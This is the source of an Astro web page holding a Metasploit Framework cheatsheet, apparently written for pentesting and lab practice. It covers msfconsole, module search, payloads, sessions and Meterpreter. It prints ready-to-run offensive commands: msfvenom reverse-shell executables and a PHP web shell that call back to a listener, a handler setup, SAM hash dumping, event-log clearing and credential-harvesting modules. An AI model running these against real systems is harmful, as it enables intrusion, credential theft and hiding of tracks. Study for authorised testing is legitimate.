---
import Base from "../../layouts/Base.astro";
---

<Base title="Metasploit Framework Cheatsheet | 0xR4sh" description="Quick reference and cheatsheet for Metasploit Framework, msfconsole, modules, payloads, and post-exploitation." activeNav="notes" mainLandmark={false}>
  <Fragment slot="head">

<style is:global>

[hidden]{display:none!important}
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
:root{
  --bg:#0a0a0c;--bg-raised:#131316;--bg-code:#070708;--panel:rgba(21,19,29,.82);
  --text:#e6e4e1;--muted:#8e8e98;--fg:#e6e4e1;
  --accent:#ff3344;--info:#9aa4b2;--warn:#e2b53e;--bad:#ff7a85;--special:#9aa4b2;
  --border:rgba(255,255,255,.09);--line:rgba(255,255,255,.12);--nav-h:55px;
  --mono:'JetBrains Mono',ui-monospace,Menlo,Consolas,monospace;
}
html{scroll-behavior:smooth}
body{background-color:var(--bg);background-image:linear-gradient(rgba(255, 51, 68,.025) 1px,transparent 1px),linear-gradient(90deg,rgba(255, 51, 68,.025) 1px,transparent 1px);background-size:36px 36px;background-attachment:fixed;color:var(--text);font-family:var(--mono);font-size:14px;line-height:1.7;-webkit-font-smoothing:antialiased;padding-top:var(--nav-h)}
::selection{background:var(--accent);color:#000}
::-webkit-scrollbar{width:6px;height:6px}::-webkit-scrollbar-track{background:var(--bg)}::-webkit-scrollbar-thumb{background:#222;border-radius:3px}
a{color:var(--accent);text-decoration:none;transition:color .2s}a:hover{color:var(--info)}
:focus-visible{outline:2px solid var(--accent);outline-offset:2px}
.wrap{max-width:1120px;margin:0 auto;padding:0 32px}
h1,h2,h3,h4{line-height:1.25;text-wrap:balance;letter-spacing:-.01em;color:#fff}
h1{font-size:clamp(1.8rem,4.6vw,2.8rem);font-weight:700}
h2{font-size:clamp(1.35rem,3vw,1.9rem);font-weight:700}
h3{font-size:1.02rem;font-weight:600}
h4{font-size:.9rem;font-weight:600}
code{font-family:var(--mono);color:var(--info);font-size:.92em}
nav{position:fixed;top:0;left:0;right:0;z-index:100;height:var(--nav-h);background:rgba(0,0,0,.92);backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);border-bottom:1px solid var(--border);padding:14px 30px;display:flex;justify-content:space-between;align-items:center;gap:16px}
nav .logo{font-weight:700;font-size:15px;color:var(--accent);letter-spacing:1px;text-decoration:none;white-space:nowrap;flex:none}
nav .logo .prompt{color:var(--muted)}
.cursor{display:inline-block;width:8px;height:17px;background:var(--accent);margin-left:4px;vertical-align:middle;animation:blink 1s step-end infinite}
@keyframes blink{50%{opacity:0}}
nav .links{display:flex;gap:24px;min-width:0;overflow-x:auto;scrollbar-width:none;align-items:center}
nav .links::-webkit-scrollbar{display:none}
nav .links a{color:#e6e4e1;font-size:13px;letter-spacing:.5px;padding:4px 8px;border-radius:3px;border:1px solid transparent;white-space:nowrap}
nav .links a:hover{color:var(--accent)}
nav .links a.active{color:var(--accent);background:rgba(255, 51, 68,.08);border-color:rgba(255, 51, 68,.25)}
.station{padding-block:60px;scroll-margin-top:calc(var(--nav-h) + 56px)}
.stack{display:flex;flex-direction:column;gap:22px}
.head{display:flex;flex-direction:column;gap:12px}
.lead{color:var(--muted);font-size:14px;line-height:1.8;max-width:72ch}
.eyebrow{font:500 11px var(--mono);letter-spacing:.2em;text-transform:uppercase;color:var(--accent)}
.chap-meta{font:500 11px var(--mono);letter-spacing:.2em;text-transform:uppercase;color:var(--accent)}
.note{font:400 12px/1.6 var(--mono);color:var(--muted)}
.warnbox{border-left:2px solid var(--warn);padding:2px 0 2px 14px;color:var(--muted);font-size:12.5px;max-width:74ch}
.warnbox b,.card b,.prose b,.lead b{color:var(--fg);font-weight:600}
.prose{display:flex;flex-direction:column;gap:12px;max-width:74ch}
.prose p{color:var(--muted);font-size:13.5px;line-height:1.8}
.g2,.g3{display:grid;gap:16px}
.g2{grid-template-columns:repeat(2,minmax(0,1fr))}
.g3{grid-template-columns:repeat(3,minmax(0,1fr))}
.card{background:var(--panel);border:1px solid var(--line);border-radius:6px;padding:18px 20px;min-width:0;display:flex;flex-direction:column;gap:10px}
.card h3{display:flex;gap:8px;align-items:center;flex-wrap:wrap}
.card p,.card li{color:var(--muted);font-size:12.5px;line-height:1.75}
.card .seen{border-top:1px dashed var(--line);padding-top:10px}
.tag{font:700 10px var(--mono);letter-spacing:.1em;padding:2px 8px;border-radius:3px;border:1px solid;white-space:nowrap;display:inline-block}
.t-cy{color:var(--info);border-color:rgba(154, 164, 178,.45);background:rgba(154, 164, 178,.08)}
.t-am{color:var(--warn);border-color:rgba(226, 181, 62,.45);background:rgba(226, 181, 62,.08)}
.t-rd{color:var(--bad);border-color:rgba(255, 51, 68,.45);background:rgba(255, 51, 68,.08)}
.t-gr{color:var(--accent);border-color:rgba(255, 51, 68,.45);background:rgba(255, 51, 68,.08)}
.tbl-wrap{overflow-x:auto;border:1px solid var(--line);border-radius:6px;background:var(--panel)}
table.tbl{width:100%;border-collapse:collapse;font-size:12.5px;min-width:560px}
.tbl th{text-align:left;font:500 10px var(--mono);letter-spacing:.18em;text-transform:uppercase;color:var(--accent);padding:10px 14px;border-bottom:1px solid var(--line);white-space:nowrap}
.tbl td{padding:10px 14px;border-bottom:1px solid var(--line);vertical-align:top;color:var(--muted);line-height:1.6}
.tbl tr:last-child td{border-bottom:0}
.tbl td:first-child{color:#fff;font-weight:700}
.pre{margin:0;background:#060606;border:1px solid var(--line);border-radius:4px;padding:12px 14px;font:400 12px/1.7 var(--mono);overflow-x:auto;color:var(--muted);white-space:pre}
.takeaways{background:var(--panel);border:1px solid var(--line);border-top:2px solid var(--accent);border-radius:6px;padding:18px 22px}
.takeaways h3{font:600 11px var(--mono);letter-spacing:.2em;text-transform:uppercase;color:var(--accent);margin-bottom:10px}
.takeaways ul{margin:0;padding-left:18px;display:flex;flex-direction:column;gap:6px;color:var(--muted);font-size:13px}
.takeaways li::marker,.plain li::marker{color:var(--accent)}
.plain{margin:0;padding-left:20px;display:flex;flex-direction:column;gap:6px;color:var(--muted);font-size:13px;max-width:78ch}
.plain b{color:var(--fg)}
.query-box{border:1px solid var(--line);border-radius:4px;overflow:hidden;background:#060606}
.query-box-header{display:flex;align-items:center;justify-content:space-between;gap:12px;padding:8px 12px;border-bottom:1px solid var(--line)}
.query-box-header h3{font-size:.82rem}
.query-actions{display:flex;align-items:center;gap:10px}
.copy-btn{font:700 11px var(--mono);padding:5px 9px;border:1px solid var(--line);border-radius:3px;background:#111;color:var(--fg);cursor:pointer}
.copy-btn:hover{border-color:var(--accent);color:var(--accent)}
.copy-status{font-size:10px;color:var(--muted)}
.query-box .pre{border:0;border-radius:0;background:transparent}
footer{border-top:1px solid var(--border);padding:30px 0;text-align:center;color:var(--muted);font-size:12px}
footer .pl{color:var(--accent)}
.page-intro{padding-top:34px;padding-bottom:24px}
.notes-layout{display:grid;grid-template-columns:minmax(220px,270px) minmax(0,1fr);gap:28px;align-items:start}
.notes-sidebar{position:sticky;top:calc(var(--nav-h) + 18px);max-height:calc(100vh - var(--nav-h) - 36px);overflow:auto;margin:18px 0;padding:16px;background:var(--panel);border:1px solid var(--line);border-radius:6px}
.notes-sidebar>summary{display:flex;justify-content:space-between;align-items:center;cursor:pointer;list-style:none;font:600 11px var(--mono);letter-spacing:.18em;text-transform:uppercase;color:var(--accent)}
.notes-sidebar>summary::-webkit-details-marker{display:none}
.notes-sidebar>summary::after{content:"+";font-size:16px;letter-spacing:0}
.notes-sidebar[open]>summary::after{content:"-"}
.notes-sidebar ol{list-style:none;margin:10px 0 0;padding:0;display:flex;flex-direction:column;gap:3px}
.notes-sidebar a{display:block;padding:5px 7px;border-radius:3px;color:var(--muted);font-size:11px;line-height:1.45}
.notes-sidebar a:hover{color:var(--accent);background:rgba(255, 51, 68,.08)}
.notes-sidebar .toc-group{display:block;font:700 10px var(--mono);letter-spacing:.14em;text-transform:uppercase;color:var(--accent);padding:10px 7px 3px;margin-top:6px}
.notes-sidebar .toc-group:hover{background:rgba(255, 51, 68,.08)}
.cat-head{padding-top:10px}
.cat-head .eyebrow{color:var(--info)}
.notes-content{min-width:0}
.notes-content .station{padding:36px 0;scroll-margin-top:calc(var(--nav-h) + 18px)}
.notes-content .station:first-child{padding-top:42px}
.notes-content .station:not(:last-child){border-bottom:1px solid var(--line)}
@media (max-width:860px){.g2,.g3{grid-template-columns:minmax(0,1fr)}.station{padding-block:46px}}
@media (max-width:640px){:root{--nav-h:51px}nav{padding:12px 16px}nav .links{gap:14px}nav .links a{font-size:12px}.wrap{padding:0 16px}}
@media (max-width:980px){.notes-layout{grid-template-columns:minmax(0,1fr);gap:8px}.notes-sidebar{position:static;max-height:55vh;margin:12px 0 0}.notes-content .station{padding:28px 0}.notes-content .station:first-child{padding-top:30px}}
@media (prefers-reduced-motion:reduce){html{scroll-behavior:auto}*,*::before,*::after{animation-duration:.01ms!important;transition-duration:.01ms!important}}
    
</style>
  </Fragment>
<header class="wrap page-intro">
  <p class="eyebrow">// notes - exploitation framework</p>
  <h1>Metasploit Framework Cheatsheet</h1>
  <p class="lead">msfconsole usage end to end. Sections 1-6 cover the console and database; 7-10 cover finding and configuring modules; 11-15 cover payloads, sessions, Meterpreter and post-exploitation; 16-18 close with msfvenom, resource scripts and a workflow checklist.</p>
</header>

<main id="main" class="wrap notes-layout">
  <details class="notes-sidebar" aria-label="On this page" open>
    <summary>On this page</summary>
    <ol>
      <li><a href="#cat-core" class="toc-group">Core console</a></li>
      <li><a href="#section-1">Starting msfconsole</a></li>
      <li><a href="#section-2">help and banner commands</a></li>
      <li><a href="#section-3">search</a></li>
      <li><a href="#section-4">use, info, back</a></li>

      <li><a href="#cat-db" class="toc-group">Database &amp; workspaces</a></li>
      <li><a href="#section-5">db_status and workspaces</a></li>
      <li><a href="#section-6">hosts and services</a></li>

      <li><a href="#cat-modules" class="toc-group">Modules &amp; options</a></li>
      <li><a href="#section-7">Module types</a></li>
      <li><a href="#section-8">show options / set / unset</a></li>
      <li><a href="#section-9">Auxiliary scanners</a></li>
      <li><a href="#section-10">exploit / run / check</a></li>

      <li><a href="#cat-payloads" class="toc-group">Payloads &amp; msfvenom</a></li>
      <li><a href="#section-11">set payload</a></li>
      <li><a href="#section-12">Staged vs stageless</a></li>
      <li><a href="#section-16">msfvenom</a></li>

      <li><a href="#cat-post" class="toc-group">Sessions &amp; post-exploitation</a></li>
      <li><a href="#section-13">sessions</a></li>
      <li><a href="#section-14">Meterpreter basics</a></li>
      <li><a href="#section-15">Post modules</a></li>

      <li><a href="#cat-workflow" class="toc-group">Automation &amp; workflow</a></li>
      <li><a href="#section-17">Resource scripts</a></li>
      <li><a href="#section-18">Workflow checklist</a></li>
    </ol>
  </details>
  <div class="notes-content">

<section id="cat-core" class="station cat-head" style="padding-bottom:0;">
  <div class="stack" style="gap:10px;">
    <p class="eyebrow">// category</p>
    <h2>Core console</h2>
    <p class="lead">Starting msfconsole, finding your way around, and searching for modules.</p>
  </div>
</section>

<section id="section-1" class="station">
  <div class="stack">
    <div class="head"><div class="chap-meta">#01</div><h2>Starting msfconsole</h2>
      <p class="lead">msfconsole is the main interface to the framework: modules, sessions and the database all live inside it. The quiet flag skips the startup banner, useful for scripted or logged runs.</p>
    </div>
    <article><div class="query-box"><div class="query-box-header"><h3>Launch</h3><div class="query-actions"><span class="copy-status" aria-live="polite"></span><button class="copy-btn" type="button">Copy</button></div></div><pre class="pre"><code>msfconsole
msfconsole -q          # no banner
msfconsole -r script.rc # run a resource script on start</code></pre></div></article>
  </div>
</section>

<section id="section-2" class="station">
  <div class="stack">
    <div class="head"><div class="chap-meta">#02</div><h2>help and banner commands</h2>
      <p class="lead"><code>help</code> lists every console command with a one-line description. <code>banner</code> redraws the ASCII logo; harmless, mostly used to confirm the console is alive mid-session.</p>
    </div>
    <article><div class="query-box"><div class="query-box-header"><h3>Core commands</h3><div class="query-actions"><span class="copy-status" aria-live="polite"></span><button class="copy-btn" type="button">Copy</button></div></div><pre class="pre"><code>help
help search
version
banner</code></pre></div></article>
  </div>
</section>

<section id="section-3" class="station">
  <div class="stack">
    <div class="head"><div class="chap-meta">#03</div><h2>search</h2>
      <p class="lead">Searches the local module database by name, CVE, platform, type or rank. Combine filters to narrow a broad term like a product name into a short, usable list.</p>
    </div>
    <article><div class="query-box"><div class="query-box-header"><h3>Search syntax</h3><div class="query-actions"><span class="copy-status" aria-live="polite"></span><button class="copy-btn" type="button">Copy</button></div></div><pre class="pre"><code>search eternalblue
search cve:2021-44228
search type:exploit platform:windows smb
search type:auxiliary name:scanner
search rank:excellent apache</code></pre></div></article>
    <div class="tbl-wrap"><table class="tbl">
      <thead><tr><th>Filter</th><th>Matches on</th></tr></thead>
      <tbody>
        <tr><td>name:</td><td>Module name/description text.</td></tr>
        <tr><td>type:</td><td>exploit, auxiliary, post, payload, encoder, nop.</td></tr>
        <tr><td>platform:</td><td>windows, linux, unix, multi, etc.</td></tr>
        <tr><td>cve:</td><td>Exact CVE identifier.</td></tr>
        <tr><td>rank:</td><td>excellent, great, good, normal, average, low, manual.</td></tr>
      </tbody>
    </table></div>
  </div>
</section>

<section id="section-4" class="station">
  <div class="stack">
    <div class="head"><div class="chap-meta">#04</div><h2>use, info, back</h2>
      <p class="lead"><code>use</code> selects a module by its full path or by the row number from the last <code>search</code>. <code>info</code> shows the module's description, options, targets and references. <code>back</code> leaves the module context.</p>
    </div>
    <article><div class="query-box"><div class="query-box-header"><h3>Select and inspect a module</h3><div class="query-actions"><span class="copy-status" aria-live="polite"></span><button class="copy-btn" type="button">Copy</button></div></div><pre class="pre"><code>use exploit/windows/smb/ms17_010_eternalblue
use 0                     # by search result index
info
back</code></pre></div></article>
  </div>
</section>

<section id="cat-db" class="station cat-head" style="padding-bottom:0;">
  <div class="stack" style="gap:10px;">
    <p class="eyebrow">// category</p>
    <h2>Database &amp; workspaces</h2>
    <p class="lead">Persist scan results and hosts across sessions instead of losing them on exit.</p>
  </div>
</section>

<section id="section-5" class="station">
  <div class="stack">
    <div class="head"><div class="chap-meta">#05</div><h2>db_status and workspaces</h2>
      <p class="lead">Metasploit stores hosts, services, credentials and loot in a PostgreSQL database when it's connected. Workspaces separate one engagement's data from another inside the same database.</p>
    </div>
    <article><div class="query-box"><div class="query-box-header"><h3>Database and workspace commands</h3><div class="query-actions"><span class="copy-status" aria-live="polite"></span><button class="copy-btn" type="button">Copy</button></div></div><pre class="pre"><code>db_status
workspace                 # list / show current
workspace -a htb-touch    # create and switch
workspace -d old-engagement</code></pre></div></article>
    <p class="note">If <code>db_status</code> shows no connection, run <code>service postgresql start</code> (Kali) or <code>msfdb init</code> once, then restart msfconsole.</p>
  </div>
</section>

<section id="section-6" class="station">
  <div class="stack">
    <div class="head"><div class="chap-meta">#06</div><h2>hosts and services</h2>
      <p class="lead">Once modules write results to the database, <code>hosts</code> and <code>services</code> give a running inventory of the current workspace without re-scanning. <code>db_nmap</code> runs nmap and stores its output automatically.</p>
    </div>
    <article><div class="query-box"><div class="query-box-header"><h3>Inventory commands</h3><div class="query-actions"><span class="copy-status" aria-live="polite"></span><button class="copy-btn" type="button">Copy</button></div></div><pre class="pre"><code>db_nmap -sV -sC 10.10.10.0/24
hosts
services
services -p 445           # filter by port
creds                      # stored credentials</code></pre></div></article>
  </div>
</section>

<section id="cat-modules" class="station cat-head" style="padding-bottom:0;">
  <div class="stack" style="gap:10px;">
    <p class="eyebrow">// category</p>
    <h2>Modules &amp; options</h2>
    <p class="lead">The five module types, setting their options, and running scanners and exploits.</p>
  </div>
</section>

<section id="section-7" class="station">
  <div class="stack">
    <div class="head"><div class="chap-meta">#07</div><h2>Module types</h2>
      <p class="lead">Every module falls into one of five categories. Knowing the type tells you what the module does and what command runs it.</p>
    </div>
    <div class="tbl-wrap"><table class="tbl">
      <thead><tr><th>Type</th><th>Does</th><th>Run with</th></tr></thead>
      <tbody>
        <tr><td>exploit</td><td>Delivers a payload by abusing a specific vulnerability.</td><td><code>exploit</code> / <code>run</code></td></tr>
        <tr><td>auxiliary</td><td>Scanning, fuzzing, DoS, login brute-force — no payload delivered.</td><td><code>run</code></td></tr>
        <tr><td>post</td><td>Runs on an existing session: gather info, pivot, escalate.</td><td><code>run</code>, needs <code>SESSION</code></td></tr>
        <tr><td>payload</td><td>The code executed on the target once an exploit succeeds.</td><td><code>set payload</code></td></tr>
        <tr><td>encoder / nop</td><td>Obfuscate or pad a payload to dodge signature-based filters.</td><td><code>set encoder</code></td></tr>
      </tbody>
    </table></div>
  </div>
</section>

<section id="section-8" class="station">
  <div class="stack">
    <div class="head"><div class="chap-meta">#08</div><h2>show options / set / unset</h2>
      <p class="lead">After <code>use</code>, <code>show options</code> lists every setting the module accepts and which ones are required. <code>set</code> assigns a value for the current module only; <code>setg</code> sets it globally for every module in the session.</p>
    </div>
    <article><div class="query-box"><div class="query-box-header"><h3>Configure a module</h3><div class="query-actions"><span class="copy-status" aria-live="polite"></span><button class="copy-btn" type="button">Copy</button></div></div><pre class="pre"><code>show options
set RHOSTS 10.10.10.5
set RPORT 445
setg LHOST 10.10.14.3      # applies to every module
unset RPORT
show targets                # if the module has multiple OS/version targets
set target 0</code></pre></div></article>
    <p class="note"><code>RHOSTS</code> accepts a single IP, a CIDR range, or a file with <code>file:/path/to/list.txt</code>.</p>
  </div>
</section>

<section id="section-9" class="station">
  <div class="stack">
    <div class="head"><div class="chap-meta">#09</div><h2>Auxiliary scanners</h2>
      <p class="lead">The <code>auxiliary/scanner/</code> tree covers service discovery, version detection and login brute-forcing without ever touching an exploit. Good first step once a port is found open.</p>
    </div>
    <article><div class="query-box"><div class="query-box-header"><h3>Common scanner modules</h3><div class="query-actions"><span class="copy-status" aria-live="polite"></span><button class="copy-btn" type="button">Copy</button></div></div><pre class="pre"><code>use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/ssh/ssh_login
use auxiliary/scanner/http/http_version
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.10.10.5
run</code></pre></div></article>
  </div>
</section>

<section id="section-10" class="station">
  <div class="stack">
    <div class="head"><div class="chap-meta">#10</div><h2>exploit / run / check</h2>
      <p class="lead"><code>exploit</code> and <code>run</code> are interchangeable for most modules. <code>check</code> asks the module to test whether the target is vulnerable without actually firing the exploit — not every module supports it, but it's worth trying first.</p>
    </div>
    <article><div class="query-box"><div class="query-box-header"><h3>Test then fire</h3><div class="query-actions"><span class="copy-status" aria-live="polite"></span><button class="copy-btn" type="button">Copy</button></div></div><pre class="pre"><code>check
exploit
exploit -j               # run as a background job
exploit -z               # run and don't interact with the session</code></pre></div></article>
  </div>
</section>

<section id="cat-payloads" class="station cat-head" style="padding-bottom:0;">
  <div class="stack" style="gap:10px;">
    <p class="eyebrow">// category</p>
    <h2>Payloads &amp; msfvenom</h2>
    <p class="lead">Choosing what runs on the target, and generating standalone payloads outside msfconsole.</p>
  </div>
</section>

<section id="section-11" class="station">
  <div class="stack">
    <div class="head"><div class="chap-meta">#11</div><h2>set payload</h2>
      <p class="lead"><code>show payloads</code> lists only the payloads compatible with the currently selected exploit. The naming convention encodes OS, architecture and behavior: <code>windows/x64/meterpreter/reverse_tcp</code>.</p>
    </div>
    <article><div class="query-box"><div class="query-box-header"><h3>Pick and configure a payload</h3><div class="query-actions"><span class="copy-status" aria-live="polite"></span><button class="copy-btn" type="button">Copy</button></div></div><pre class="pre"><code>show payloads
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.3
set LPORT 4444</code></pre></div></article>
  </div>
</section>

<section id="section-12" class="station">
  <div class="stack">
    <div class="head"><div class="chap-meta">#12</div><h2>Staged vs stageless</h2>
      <p class="lead">A staged payload (<code>.../meterpreter/reverse_tcp</code>) sends a tiny stager first, which then pulls the full payload over the network — smaller initial footprint, needs a stable connection. A stageless payload (<code>.../meterpreter_reverse_tcp</code>, one word) sends everything at once — larger, more reliable on flaky links.</p>
    </div>
    <div class="tbl-wrap"><table class="tbl">
      <thead><tr><th>Type</th><th>Naming</th><th>Trade-off</th></tr></thead>
      <tbody>
        <tr><td>Staged</td><td>stage/stager split, e.g. <code>windows/meterpreter/reverse_tcp</code></td><td>Small first hit, more fragile on unstable networks.</td></tr>
        <tr><td>Stageless</td><td>one combined name, e.g. <code>windows/meterpreter_reverse_tcp</code></td><td>Bigger file, more reliable, easier to run standalone.</td></tr>
      </tbody>
    </table></div>
  </div>
</section>

<section id="cat-post" class="station cat-head" style="padding-bottom:0;">
  <div class="stack" style="gap:10px;">
    <p class="eyebrow">// category</p>
    <h2>Sessions &amp; post-exploitation</h2>
    <p class="lead">Managing shells and Meterpreter sessions once a target is popped.</p>
  </div>
</section>

<section id="section-13" class="station">
  <div class="stack">
    <div class="head"><div class="chap-meta">#13</div><h2>sessions</h2>
      <p class="lead">Every successful exploit or handler opens a session. <code>sessions</code> lists, interacts with, and manages them — multiple sessions can run in parallel across different targets.</p>
    </div>
    <article><div class="query-box"><div class="query-box-header"><h3>Session management</h3><div class="query-actions"><span class="copy-status" aria-live="polite"></span><button class="copy-btn" type="button">Copy</button></div></div><pre class="pre"><code>sessions -l               # list
sessions -i 1             # interact with session 1
background                # from inside a session, back to msf (Ctrl+Z also works)
sessions -k 1             # kill session 1
sessions -u 1             # upgrade a shell to meterpreter</code></pre></div></article>
  </div>
</section>

<section id="section-14" class="station">
  <div class="stack">
    <div class="head"><div class="chap-meta">#14</div><h2>Meterpreter basics</h2>
      <p class="lead">Meterpreter is an in-memory post-exploitation agent: file operations, process control and pivoting without touching disk any more than necessary.</p>
    </div>
    <div class="g2">
      <article class="card"><h3>Recon</h3><p><code>sysinfo</code>, <code>getuid</code>, <code>ps</code>, <code>getpid</code> — confirm who and where you are first.</p></article>
      <article class="card"><h3>Filesystem</h3><p><code>pwd</code>, <code>ls</code>, <code>cd</code>, <code>download file</code>, <code>upload file</code>, <code>cat file</code>.</p></article>
    </div>
    <article><div class="query-box"><div class="query-box-header"><h3>Common Meterpreter commands</h3><div class="query-actions"><span class="copy-status" aria-live="polite"></span><button class="copy-btn" type="button">Copy</button></div></div><pre class="pre"><code>sysinfo
getuid
ps
shell                      # drop to a native shell
migrate &lt;pid&gt;              # move into another process
hashdump                   # Windows SAM hashes (needs SYSTEM)
screenshot
clearev                    # clear Windows event logs</code></pre></div></article>
  </div>
</section>

<section id="section-15" class="station">
  <div class="stack">
    <div class="head"><div class="chap-meta">#15</div><h2>Post modules</h2>
      <p class="lead">The <code>post/</code> tree runs against an existing session instead of the network: credential harvesting, privilege-escalation checks, persistence, enumeration scripts. Needs <code>SESSION</code> set, not <code>RHOSTS</code>.</p>
    </div>
    <article><div class="query-box"><div class="query-box-header"><h3>Example post modules</h3><div class="query-actions"><span class="copy-status" aria-live="polite"></span><button class="copy-btn" type="button">Copy</button></div></div><pre class="pre"><code>use post/windows/gather/hashdump
use post/multi/recon/local_exploit_suggester
use post/linux/gather/enum_configs
set SESSION 1
run</code></pre></div></article>
    <p class="note"><code>local_exploit_suggester</code> checks a live session against known local-privesc modules — fast way to shortlist kernel/service exploits worth trying.</p>
  </div>
</section>

<section id="cat-workflow" class="station cat-head" style="padding-bottom:0;">
  <div class="stack" style="gap:10px;">
    <p class="eyebrow">// category</p>
    <h2>Automation &amp; workflow</h2>
    <p class="lead">Standalone payload generation, scripting repeat setups, and the overall order of operations.</p>
  </div>
</section>

<section id="section-16" class="station">
  <div class="stack">
    <div class="head"><div class="chap-meta">#16</div><h2>msfvenom</h2>
      <p class="lead">Generates a standalone payload file outside msfconsole — useful when you need an .exe, .elf, .apk or shellcode blob to deliver by some other means (upload, phishing, USB).</p>
    </div>
    <article><div class="query-box"><div class="query-box-header"><h3>Common output formats</h3><div class="query-actions"><span class="copy-status" aria-live="polite"></span><button class="copy-btn" type="button">Copy</button></div></div><pre class="pre"><code># Windows exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f exe -o shell.exe

# Linux ELF
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f elf -o shell.elf

# PHP web shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f raw -o shell.php

# list every payload for a platform
msfvenom -l payloads | grep windows</code></pre></div></article>
    <p class="note">Match the handler to the payload exactly (same path, LHOST, LPORT) — <code>use exploit/multi/handler</code> catches a msfvenom callback.</p>
  </div>
</section>

<section id="section-17" class="station">
  <div class="stack">
    <div class="head"><div class="chap-meta">#17</div><h2>Resource scripts</h2>
      <p class="lead">A <code>.rc</code> file is a plain list of msfconsole commands, replayed in order. Useful for repeatable handler setups or standard scan sequences.</p>
    </div>
    <article><div class="query-box"><div class="query-box-header"><h3>Example handler.rc</h3><div class="query-actions"><span class="copy-status" aria-live="polite"></span><button class="copy-btn" type="button">Copy</button></div></div><pre class="pre"><code>use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.3
set LPORT 4444
exploit -j -z</code></pre></div></article>
    <article><div class="query-box"><div class="query-box-header"><h3>Run it</h3><div class="query-actions"><span class="copy-status" aria-live="polite"></span><button class="copy-btn" type="button">Copy</button></div></div><pre class="pre"><code>msfconsole -r handler.rc
# or from inside an already-running console:
resource handler.rc</code></pre></div></article>
  </div>
</section>

<section id="section-18" class="station">
  <div class="stack">
    <div class="head"><div class="chap-meta">#18</div><h2>Workflow checklist</h2>
      <p class="lead">A repeatable order for a module-driven engagement.</p>
    </div>
    <ol class="plain">
      <li><b>Set up</b> — start the database, create a workspace, run <code>db_nmap</code> against the target.</li>
      <li><b>Find a module</b> — <code>search</code> by service/CVE, <code>use</code> it, read <code>info</code>.</li>
      <li><b>Configure</b> — <code>show options</code>, set <code>RHOSTS</code>/<code>RPORT</code>, pick a <code>target</code> if there are several.</li>
      <li><b>Verify</b> — run <code>check</code> if supported, before firing.</li>
      <li><b>Payload</b> — <code>show payloads</code>, set one matching the target OS/arch, set <code>LHOST</code>/<code>LPORT</code>.</li>
      <li><b>Fire and manage</b> — <code>exploit</code>, then <code>sessions -l</code>/<code>-i</code> to work the resulting shell or Meterpreter session.</li>
      <li><b>Post-exploit</b> — enumerate with <code>post/</code> modules, or drop a resource script to make the handler setup repeatable.</li>
    </ol>
    <div class="takeaways"><h3>Key takeaways</h3><ul>
      <li>Everything in msfconsole is a module (exploit, auxiliary, post, payload, encoder) run the same way: use, set options, run.</li>
      <li><code>check</code> before <code>exploit</code> when it's available — cheaper than a failed attempt.</li>
      <li>msfvenom and <code>exploit/multi/handler</code> are the pair for standalone payloads: generate outside, catch inside.</li>
    </ul></div>
  </div>
</section>

  </div>
</main>


<script is:inline>
(function () {
  const toc = document.querySelector('.notes-sidebar');
  const compact = window.matchMedia('(max-width: 980px)');
  const updateToc = function () { toc.open = !compact.matches; };
  updateToc();
  if (compact.addEventListener) compact.addEventListener('change', updateToc);
  else compact.addListener(updateToc);

  const fallbackCopy = function (text) {
    const field = document.createElement('textarea');
    field.value = text;
    field.setAttribute('readonly', '');
    field.style.position = 'fixed';
    field.style.opacity = '0';
    document.body.appendChild(field);
    field.select();
    const copied = document.execCommand('copy');
    field.remove();
    if (!copied) throw new Error('Clipboard copy was rejected.');
  };

  document.querySelectorAll('.query-box').forEach(function (box) {
    const button = box.querySelector('.copy-btn');
    const status = box.querySelector('.copy-status');
    button.addEventListener('click', async function () {
      const text = box.querySelector('code').textContent.trim();
      try {
        if (navigator.clipboard && navigator.clipboard.writeText) {
          await navigator.clipboard.writeText(text);
        } else {
          fallbackCopy(text);
        }
        status.textContent = 'Copied.';
      } catch (error) {
        console.error('Unable to copy query text.', error);
        status.textContent = 'Copy failed. Select and copy the text manually.';
      }
    });
  });
})();
</script>
